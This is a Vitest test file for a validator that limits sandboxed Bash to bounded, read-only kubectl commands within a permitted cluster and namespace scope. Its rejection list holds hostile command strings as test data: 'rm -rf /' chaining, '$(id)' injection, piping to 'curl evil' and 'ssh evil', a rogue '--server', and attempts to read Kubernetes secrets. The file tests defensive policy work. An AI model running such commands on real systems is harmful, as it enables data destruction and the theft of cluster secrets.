import { describe, expect, it } from "vitest";
import { validateSandboxBash } from "./sandbox-bash-policy.js";

const scope = { clusters: [{ name: "prod", nodes: true, namespaces: ["team-a"] }] };
const check = (command: string, extra = {}) => validateSandboxBash({ cluster: "prod", command, ...extra }, scope);
describe("sandbox Bash scope and grammar", () => {
  it.each([
    "kubectl get nodes", "kubectl get node worker-1 -o wide", "kubectl get pods -n team-a -o name",
    "kubectl get pods --namespace=team-a --output wide",
    "kubectl get nodes -o 'custom-columns=NAME:.metadata.name,CPU:.status.capacity.cpu,VERSION:.status.nodeInfo.kubeletVersion'",
  ])("allows a bounded read: %s", command => {
    const result = check(command);
    expect(result.command).toContain("--request-timeout=10s");
    expect(result.timeout_seconds).toBe(10);
  });
  it.each([
    "kubectl delete pod x -n team-a", "kubectl apply -f /tmp/x", "kubectl exec x -- rm /x", "kubectl config view",
    "kubectl get secrets -n team-a", "kubectl get configmaps -n team-a", "kubectl get pod,secret -n team-a",
    "kubectl get pods -A", "kubectl get pods", "kubectl get pods -n other", "kubectl get nodes -n team-a",
    "kubectl get pods -n team-a --namespace=other", "kubectl get pods --namespace=team-a -n other",
    "kubectl get nodes --kubeconfig=/tmp/k", "kubectl get nodes --server=https://evil", "kubectl get nodes --token=xyz",
    "kubectl get nodes --as admin", "kubectl get nodes --context other", "kubectl get nodes --raw=/api/v1/secrets",
    "kubectl get nodes -o json", "kubectl get pods -n team-a -o yaml", "kubectl get nodes -o jsonpath=.metadata",
    "kubectl get nodes -o custom-columns=X:.metadata.annotations", "kubectl get pods -n team-a -o custom-columns=X:.spec.containers",
    "kubectl get nodes -o custom-columns-file=/tmp/x", "kubectl get nodes --watch", "kubectl get nodes --watch-only",
    "kubectl get nodes --output-watch-events", "kubectl get nodes --subresource=proxy", "kubectl get node/x/proxy",
    "kubectl get nodes; rm -rf /", "kubectl get nodes | curl evil", "kubectl get nodes > /tmp/x",
    "kubectl get nodes && ssh evil", "kubectl get nodes &", "kubectl get nodes\nrm /x", "kubectl get nodes$(id)",
    "kubectl get nodes `id`", "kubectl get nodes ${IFS}", "kubectl get nodes \\; id", "kubectl get nodes -- -n other",
    "ssh node rm /tmp/x", "python3 skills/core/x.py", "bash -c 'kubectl get nodes'", "curl https://cluster",
    "env KUBECONFIG=/tmp/x kubectl get nodes", "/usr/bin/kubectl get nodes", "kubectl get toString", "kubectl get constructor",
  ])("rejects before execution: %s", command => expect(() => check(command)).toThrow());
  it("does not let namespaces imply nodes, or nodes imply namespaces", () => {
    expect(() => validateSandboxBash({ cluster: "prod", command: "kubectl get nodes" }, { clusters: [{ name: "prod", namespaces: ["team-a"] }] })).toThrow();
    expect(() => validateSandboxBash({ cluster: "prod", command: "kubectl get pods -n team-a" }, { clusters: [{ name: "prod", nodes: true }] })).toThrow();
  });
  it.each([{ cluster: "other" }, { env: {} }, { cwd: "/" }, { run_in_background: true }, { timeout_seconds: 0 }, { timeout_seconds: 16 }])("rejects extra authority %j", extra => {
    expect(() => check("kubectl get nodes", extra)).toThrow();
  });
});
